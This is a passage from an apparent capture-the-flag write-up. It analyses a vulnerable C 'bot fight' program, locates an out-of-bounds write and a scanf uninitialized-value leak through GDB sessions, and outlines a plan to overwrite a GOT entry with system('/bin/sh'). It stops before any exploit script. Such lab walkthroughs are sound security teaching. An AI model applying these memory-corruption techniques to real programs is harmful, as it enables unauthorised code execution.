<span class="mtk1">    </span><span class="mtk1">seed_generator</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fopen</span><span class="mtk1">(</span><span class="mtk4">"/dev/urandom"</span><span class="mtk1">, </span><span class="mtk4">"r"</span><span class="mtk1">);</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">argc</span><span class="mtk1">, </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span> <span class="mtk9 mtki">argv</span><span class="mtk5">[]</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">choice</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8">init</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk8">reseed</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">print_menu</span><span class="mtk1">();</span>

<span class="mtk1">        </span><span class="mtk5">while</span> <span class="mtk1">((</span><span class="mtk1">choice</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">getc</span><span class="mtk1">(</span><span class="mtk8">stdin</span><span class="mtk1">)), </span><span class="mtk1">choice</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">);</span>

<span class="mtk1">        </span><span class="mtk5">switch</span> <span class="mtk1">(</span><span class="mtk1">choice</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk4">'f'</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">fight_bot</span><span class="mtk1">();</span>
<span class="mtk1">                </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">            </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk4">'s'</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">simulate</span><span class="mtk1">();</span>
<span class="mtk1">                </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">            </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk4">'p'</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">print_game_history</span><span class="mtk1">();</span>
<span class="mtk1">                </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">            </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk4">'r'</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">reseed</span><span class="mtk1">();</span>
<span class="mtk1">                </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">            </span><span class="mtk5">default</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid choice"</span><span class="mtk1">);</span>
<span class="mtk1">                </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>This program allows us to fight with a bot. The game consists in two players sending a 64-bit integer. The winner is the one that has more bits set to <code>1</code>. In case both numbers have the same bit count, wins the one that has more bits at <code>1</code> as least significant bits.</p><p>For instance, <code>111...1</code> wins <code>000...0</code>, and <code>1011...1</code> wins <code>1101...1</code>. The function that handles this process is <code>cmp</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">cmp</span><span class="mtk1">(</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk9 mtki">a</span><span class="mtk1">, </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk9 mtki">b</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">__builtin_popcountll</span><span class="mtk1">(</span><span class="mtk9 mtki">a</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk8">__builtin_popcountll</span><span class="mtk1">(</span><span class="mtk9 mtki">b</span><span class="mtk1">)) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">__builtin_popcountll</span><span class="mtk1">(</span><span class="mtk9 mtki">a</span><span class="mtk1">) </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk8">__builtin_popcountll</span><span class="mtk1">(</span><span class="mtk9 mtki">b</span><span class="mtk1">) </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>  
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">for</span> <span class="mtk1">(</span><span class="mtk8 mtku">size_t</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk9 mtki">a</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> (</span><span class="mtk9 mtki">b</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)) {</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">a</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk9 mtki">a</span><span class="mtk1"> </span><span class="mtk5">&gt;&gt;=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk9 mtki">b</span><span class="mtk1"> </span><span class="mtk5">&gt;&gt;=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>We have two possibilities, one of them is <code>fight_bot</code>, and the bot choice is random:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">fight_bot</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk1">bot_num</span><span class="mtk1">, </span><span class="mtk1">player_num</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk1">bot_num</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_random_ull</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Bot plays </span><span class="mtk6">%llu</span><span class="mtk4">!</span><span class="mtk6">\n</span><span class="mtk4">Player plays: "</span><span class="mtk1">, </span><span class="mtk1">bot_num</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%llu%*c</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">player_num</span><span class="mtk1">);</span>
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">cmp</span><span class="mtk1">(</span><span class="mtk1">player_num</span><span class="mtk1">, </span><span class="mtk1">bot_num</span><span class="mtk1">)) {</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"You win!"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">*</span><span class="mtk1">((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">game_history</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk1">number_of_games</span><span class="mtk1"> </span><span class="mtk5">/</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">)) </span><span class="mtk5">|=</span><span class="mtk1"> ((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1">)</span> <span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> (</span><span class="mtk1">number_of_games</span><span class="mtk1"> </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">));</span>
<span class="mtk1">    }</span> <span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Bot wins!"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">*</span><span class="mtk1">((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">game_history</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk1">number_of_games</span><span class="mtk1"> </span><span class="mtk5">/</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">)) </span><span class="mtk5">&amp;=</span><span class="mtk1"> (</span><span class="mtk5">~</span><span class="mtk1">((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1">)</span> <span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> (</span><span class="mtk1">number_of_games</span><span class="mtk1"> </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">)));</span>  
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk1">number_of_games</span><span class="mtk5">++</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Here, we can either win or lose. The result will be written as a bit in <code>game_history</code>. Notice that we can easily decide to win or lose by sending <code>111...1</code> or <code>000...0</code>.</p><p>Also, there is an out-of-bounds (OOB) write here, since we can write past <code>game_history</code>, as long as we can increase the value of <code>number_of_games</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">cmp</span><span class="mtk1">(</span><span class="mtk1">player_num</span><span class="mtk1">, </span><span class="mtk1">bot_num</span><span class="mtk1">)) {</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"You win!"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">*</span><span class="mtk1">((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">game_history</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk1">number_of_games</span><span class="mtk1"> </span><span class="mtk5">/</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">)) </span><span class="mtk5">|=</span><span class="mtk1"> ((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1">)</span> <span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> (</span><span class="mtk1">number_of_games</span><span class="mtk1"> </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">));</span>
<span class="mtk1">    }</span> <span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Bot wins!"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">*</span><span class="mtk1">((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">game_history</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk1">number_of_games</span><span class="mtk1"> </span><span class="mtk5">/</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">)) </span><span class="mtk5">&amp;=</span><span class="mtk1"> (</span><span class="mtk5">~</span><span class="mtk1">((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1">)</span> <span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> (</span><span class="mtk1">number_of_games</span><span class="mtk1"> </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">)));</span>  
<span class="mtk1">    }</span>
</code></pre></div><p>Since <code>game_history</code> is a global variable, maybe we can alter the subsequent global variables:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk1">number_of_games</span><span class="mtk1">;</span>  
<span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk1">game_history</span><span class="mtk1">;</span>
<span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk1">seed</span><span class="mtk1">;</span>
<span class="mtk8 mtku">FILE</span><span class="mtk1"></span><span class="mtk5">*</span> <span class="mtk1">seed_generator</span><span class="mtk1">;</span>
</code></pre></div><p>The other option we have is to simulate a fight with <code>simulate</code>, where we can choose both numbers to play:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">simulate</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk1">bot_num</span><span class="mtk1">, </span><span class="mtk1">player_num</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Bot number: "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%llu%*c</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">bot_num</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Player number: "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%llu%*c</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">player_num</span><span class="mtk1">);</span>
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Simulation result: "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">cmp</span><span class="mtk1">(</span><span class="mtk1">bot_num</span><span class="mtk1">, </span><span class="mtk1">player_num</span><span class="mtk1">) </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Bot win!"</span><span class="mtk1">)</span> <span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"You win!"</span><span class="mtk1">);</span>  
<span class="mtk1">}</span>
</code></pre></div><p>At first glance, this function is useless for exploitation. But we&rsquo;ll see later.</p><p>There&rsquo;s one more function to print the history of fights:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">print_game_history</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk5">for</span> <span class="mtk1">(</span><span class="mtk8 mtku">size_t</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk1">number_of_games</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Game </span><span class="mtk6">%d</span><span class="mtk4">: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, (</span><span class="mtk7 mtki">int</span><span class="mtk1">)</span> <span class="mtk1">i</span> <span class="mtk5">+</span> <span class="mtk6">1</span><span class="mtk1">, (</span><span class="mtk5">*</span><span class="mtk1">((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">game_history</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk1">number_of_games</span><span class="mtk1"> </span><span class="mtk5">/</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">)) </span><span class="mtk5">&amp;</span><span class="mtk1"> (</span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> (</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">))) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk4">"Won"</span> <span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk4">"Lost"</span><span class="mtk1">);</span>  
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>However, this function does not work as expected, because of the <code>== 1</code> at the end. It could have been a nice function to get a kind of OOB read and leak some memory addresses. But we can conclude that this function is useless.</p><p>We might also want to use <code>reseed</code>, to renew the seed of the PRNG:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">reseed</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Bot reseeded!"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">fread</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">seed</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk1">seed_generator</span><span class="mtk1">);</span>  
<span class="mtk1">    </span><span class="mtk8">srand</span><span class="mtk1">(</span><span class="mtk1">seed</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>There&rsquo;s nothing more to do. We only found an OOB write, but we can&rsquo;t do anything without memory leaks&mldr;</p><h2 id="setup-environment">Setup environment</h2><p>We might want to patch the binary so that it uses the provided Glibc and loader:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">cp</span> <span class="mtku">libc-2.39.so</span> libc.so.6

<span class="code-cyan">$</span> <span class="code-dark-green">patchelf</span> --set-interpreter <span class="mtku">ld-2.39.so</span> --set-rpath <span class="mtku">.</span> <span class="mtku">chall</span>  
</code></pre></div><h2 id="debugging-with-gdb">Debugging with GDB</h2><p>First thing we can do is analyze the OOB write, to see what we can clobber:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">chall</span>
Loading GEF...
Reading symbols from <span class="code-dark-green">chall</span>...
(No debugging symbols found in <span class="code-dark-green">chall</span>)
<span class="code-red">gef&gt; </span>run
Starting program: <span class="code-dark-green">/tmp/chall</span>
warning: Expected absolute pathname for libpthread in the inferior, but got <span class="code-dark-green">./libc.so.6</span>.
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.  
Bot reseeded!
f) Fight bot
s) Simulate game
p) Print game history
r) Reseed bot
&gt; ^C
Program received signal SIGINT, Interrupt.
<span class="code-dark-blue">0x00007ffff7ec6a61</span> in <span class="code-dark-yellow">read</span> () from <span class="code-dark-green">./libc.so.6</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/10gx &game_history
<span class="code-dark-blue">0x404088</span> &lt;<span class="code-dark-yellow">game_history</span>&gt;:        0x0000000000000000      0xa1833112f255d417  
<span class="code-dark-blue">0x404098</span> &lt;<span class="code-dark-yellow">seed_generator</span>&gt;:      0x00000000004052a0      0x0000000000000000
<span class="code-dark-blue">0x4040a8</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4040b8</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4040c8</span>:       0x0000000000000000      0x0000000000000000
</code></pre></div><p>We see that the <code>FILE</code> structure from <code>seed_generator</code> is stored at <code>0x4052a0</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/60gx 0x4052a0
<span class="code-dark-blue">0x4052a0</span>:       0x00000000fbad2488      0x0000000000405488  
<span class="code-dark-blue">0x4052b0</span>:       0x0000000000406480      0x0000000000405480
<span class="code-dark-blue">0x4052c0</span>:       0x0000000000405480      0x0000000000405480
<span class="code-dark-blue">0x4052d0</span>:       0x0000000000405480      0x0000000000405480
<span class="code-dark-blue">0x4052e0</span>:       0x0000000000406480      0x0000000000000000
<span class="code-dark-blue">0x4052f0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405300</span>:       0x0000000000000000      0x00007ffff7faf4e0
<span class="code-dark-blue">0x405310</span>:       0x0000000000000003      0x0000000000000000
<span class="code-dark-blue">0x405320</span>:       0x0000000000000000      0x0000000000405380
<span class="code-dark-blue">0x405330</span>:       0xffffffffffffffff      0x0000000000000000
<span class="code-dark-blue">0x405340</span>:       0x0000000000405390      0x0000000000000000
<span class="code-dark-blue">0x405350</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405360</span>:       0x00000000ffffffff      0x0000000000000000
<span class="code-dark-blue">0x405370</span>:       0x0000000000000000      0x00007ffff7fad030
<span class="code-dark-blue">0x405380</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405390</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4053a0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4053b0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4053c0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4053d0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4053e0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4053f0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405400</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405410</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405420</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405430</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405440</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405450</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405460</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405470</span>:       0x00007ffff7fad228      0x0000000000001011
</code></pre></div><p>Alright, so we could be able to modify this <code>FILE</code> structure using the OOB write. However, we need to get a Glibc leak before attempting this.</p><p>Notice that the binary has Partial RELRO and no PIE, so we can easily target the GOT. For instance, we will try to tell that some function in the GOT resolves to <code>system</code> and then execute <code>system("/bin/sh")</code>.</p><h3 id="leaking-memory-addresses">Leaking memory addresses</h3><p>After a lot of thinking, I found out what was the purpose of <code>simulate</code>. It is supposed to be exploited to leak uninitialized values in <code>scanf</code>! Let&rsquo;s have a look:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>break __isoc99_scanf
Breakpoint 1 at <span class="code-dark-blue">0x7ffff7e0ae08</span>
<span class="code-green">gef&gt; </span>break cmp
Breakpoint 2 at <span class="code-dark-blue">0x40125e</span>
<span class="code-green">gef&gt; </span>continue
Continuing.
s
Bot number:
Breakpoint 1, <span class="code-dark-blue">0x00007ffff7e0ae08</span> in <span class="code-dark-yellow">__isoc99_scanf</span> () from <span class="code-dark-green">./libc.so.6</span>  
</code></pre></div><p>We are sending a <code>-</code> sign to avoid that <code>scanf</code> writes anything to <code>$rsi</code>, it just leaves the register untouched:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/s $rdi
<span class="code-dark-blue">0x40206f</span>:       "%llu%*c"
<span class="code-green">gef&gt; </span>x/gx $rsi
<span class="code-dark-blue">0x7fffffffe728</span>: 0x00007ffff7e405c2
<span class="code-green">gef&gt; </span>x 0x00007ffff7e405c2
<span class="code-dark-blue">0x7ffff7e405c2</span> &lt;<span class="code-dark-yellow">_IO_default_uflow</span>+50&gt;:  0x438b480f74fff883
<span class="code-green">gef&gt; </span>c
Continuing.
-
Player number:
Breakpoint 1, <span class="code-dark-blue">0x00007ffff7e0ae08</span> in <span class="code-dark-yellow">__isoc99_scanf</span> () from <span class="code-dark-green">./libc.so.6</span>  
</code></pre></div><p>We see that in the first <code>scanf</code> we have <code>$rsi = 0x7ffff7e405c2</code>, which is a Glibc address. The second <code>scanf</code> contains a stack address (not so important):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/s $rdi
<span class="code-dark-blue">0x40206f</span>:       "%llu%*c"
<span class="code-green">gef&gt; </span>x/gx $rsi
<span class="code-dark-blue">0x7fffffffe730</span>: 0x00007fffffffe898
<span class="code-green">gef&gt; </span>continue
Continuing.
-
Simulation result:
Breakpoint 2, <span class="code-dark-blue">0x000000000040125e</span> in <span class="code-dark-yellow">cmp</span> ()  
